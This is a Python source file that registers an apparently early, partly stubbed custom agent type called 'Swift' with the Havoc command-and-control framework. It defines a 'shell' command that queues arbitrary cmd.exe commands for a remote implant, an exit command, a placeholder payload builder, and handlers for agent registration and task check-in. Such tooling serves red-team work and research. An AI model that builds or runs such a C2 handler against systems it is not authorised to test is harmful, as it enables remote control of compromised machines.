from havoc.service import HavocService
from havoc.agent import *

class CommandShell(Command):
    #CommandId = 18
    Name = "shell"
    Description = "executes commands using cmd.exe"
    Help = ""
    NeedAdmin = False
    Params = [
        CommandParam(
            name="commands",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = []

    def job_generate(self, arguments: dict) -> bytes:
        print("[*] job generate")
        packer = Packer()

        #AesKey = base64.b64decode(arguments["__meta_AesKey"])
        #AesIV = base64.b64decode(arguments["__meta_AesIV"])

        #commands = "/C " + arguments["commands"]
        #packer.add_data(commands)
        packer.add_data(arguments["commands"])
        return packer.buffer
        '''
        task_id = int(arguments["TaskID"], 16)
        job = TaskJob(
            command=self.CommandId,
            task_id=task_id,
            data=packer.buffer.decode('utf-8'),
            aes_key=AesKey,
            aes_iv=AesIV
        )

        return job.generate()[4:]
        '''

class CommandExit(Command):
    #CommandId   = COMMAND_EXIT
    Name        = "exit"
    Description = "tells the agent to exit"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = []

    def job_generate( self, arguments: dict ) -> bytes:

        Task = Packer()
        Task.add_data("goodbye")
        return Task.buffer #Queue "goodbye" as a tasking. Easy!

class Swift(AgentType):
    Name = "Swift"
    Author = "@smallbraintranman"
    Version = "0.1"
    Description = f"""Test Description version: {Version}. I like C# a little too much."""
    MagicValue = 0x41414141

    Arch = [
        "x64",
    ]

    Formats = [
        {
            "Name": "Windows Executable",
            "Extension": "exe",
        },
    ]

    BuildingConfig = {

        "Sleep": "10",

        "TestList": [
            "list 1",
            "list 2",
            "list 3",
        ],

        "TestBool": True,

        "TestObject": {
            "TestText": "DefaultValue",
            "TestList": [
                "list 1",
                "list 2",
                "list 3",
            ],
            "TestBool": True,
        }
    }

    #SupportedOS = [
    #    SupportedOS.Windows
    #]

    Commands = [
        CommandShell(),
        CommandExit(),
    ]

    def generate( self, config: dict ) -> None:

        self.builder_send_message( config[ 'ClientID' ], "Info", f"hello from service builder" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )

        self.builder_send_payload( config[ 'ClientID' ], self.Name + ".bin", "test bytes".encode('utf-8') )
    '''
    def command_not_found(self, response: dict) -> dict:
        if response["CommandID"] == 90:  # CALLBACK_OUTPUT

            decoded = base64.b64decode(response["Response"])
            parser = Parser(decoded, len(decoded))
            output = parser.parse_bytes()

            return {
                "Type": "Good",
                "Message": f"Received Output [{len(output)} bytes]",
                "Output": output.decode('utf-8')
            }

        return {
            "Type": "Error",
            "Message": f"Command not found: [CommandID: {response['CommandID']}]",
        }
    '''
    def response( self, response: dict ) -> bytes:
        agent_header    = response[ "AgentHeader" ]

        print("Receieved request from agent")
        agent_header    = response[ "AgentHeader" ]
        agent_response  = b64decode( response[ "Response" ] ) # the teamserver base64 encodes the request.
        #print(agent_response)
        agentjson = json.loads(agent_response)
        #print(agent_header)
        if agentjson["task"] == "register":
            #print(json.dumps(agentjson,indent=4))
            print("[*] Registered agent")
            self.register( agent_header, json.loads(agentjson["data"]) )
            AgentID = response[ "AgentHeader" ]["AgentID"]
            self.console_message( AgentID, "Good", f"Swift agent {AgentID} registered", "" )
            return b'registered'
        elif agentjson["task"] == "gettask":
            AgentID = response[ "Agent" ][ "NameID" ]
            self.console_message( AgentID, "Good", "Host checkin", "" )

            print("[*] Agent requested taskings")
            Tasks = self.get_task_queue( response[ "Agent" ] )
            print("Tasks retrieved")
            if len(agentjson["data"]) > 0:
                print("Output: " + agentjson["data"])
                self.console_message( AgentID, "Good", "Received Output:", agentjson["data"] )
            print(Tasks)
        return Tasks


def main():
    Havoc_Swift = Swift()
    Havoc_Service = HavocService(
        endpoint="ws://localhost:40056/service-endpoint",
        password="service-password"
    )

    Havoc_Service.register_agent(Havoc_Swift)

    return


if __name__ == '__main__':
    main()